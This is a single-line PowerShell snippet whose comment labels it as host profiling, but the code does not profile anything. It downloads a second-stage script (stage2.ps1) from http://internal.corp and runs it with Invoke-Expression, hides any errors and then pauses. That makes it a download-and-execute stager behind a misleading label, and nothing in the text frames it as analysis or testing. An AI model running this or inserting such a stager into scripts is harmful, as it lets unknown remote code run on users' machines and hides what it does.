
<# Host profiling #> $Stage1Url = 'http://internal.corp/stage2.ps1'; IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing -ErrorAction SilentlyContinue).Content; Start-Sleep -Seconds 5
